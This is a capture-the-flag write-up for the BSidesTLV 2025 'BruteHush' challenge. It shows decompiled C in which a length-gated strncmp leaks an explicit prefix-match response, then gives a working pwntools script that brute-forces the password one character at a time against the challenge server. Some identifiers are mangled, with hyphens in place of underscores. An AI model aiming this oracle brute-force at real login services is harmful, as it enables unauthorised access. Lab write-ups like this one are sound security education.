# BSidesTLV 2025 - BruteHush: Character-by-Character Password Brute Force

The challenge binary reads a password from a file and compares it against our input. Reversing it in Ghidra reveals the key weakness: the comparison is length-gated, and the binary returns a distinct response - `"Hmm... I feel like you're trying something."` - when our input matches a prefix of the correct password.

```
      printf("Enter password: ");
      fflush(stdout);
      pcVar4 = fgets(local-c8,0x32,stdin);
      if (pcVar4 == (char *)0x0) break;
      sVar5 = strcspn(local-c8,"\r\n");
      local-c8[sVar5] = '\0';
      sVar5 = strlen(local-c8);
      iVar1 = strncmp(local-108,local-c8,sVar5);
      if (iVar1 == 0) {
        if (local-c8[0] == '\0') {
          puts("[Gremlin]: lol, you don\'t really think I\'m so stupid");
          fflush(stdout);
        }
```

## The Vulnerability

The comparison loop exits as soon as it finds a mismatch, but only checks up to `len(input)` characters. This means that if our input is a correct prefix of the password, we get the prefix-match response.

This is a classic timing/oracle side-channel - except here the oracle is explicit in the response text rather than timing.

## Exploit

We iterate character by character over all printable ASCII, extending the known prefix whenever we get the prefix-match response:

```python
from pwn import *
import string

r = remote('0.cloud.chals.io', 10188)
r.recvuntil(b'Enter password: ')

password = ''
chars = string.ascii-letters + string.digits + string.punctuation

while True:
    found = False
    for c in chars:
        guess = password + c
        r.sendline(guess.encode())
        resp = r.recvline().decode()
        if "Hmm... I feel like you're trying something." in resp:
            password += c
            log.success(f"Prefix match: {password}")
            found = True
            break
        elif "Flag:" in resp:
            log.success(resp)
            r.close()
            exit()
    if not found:
        break
```
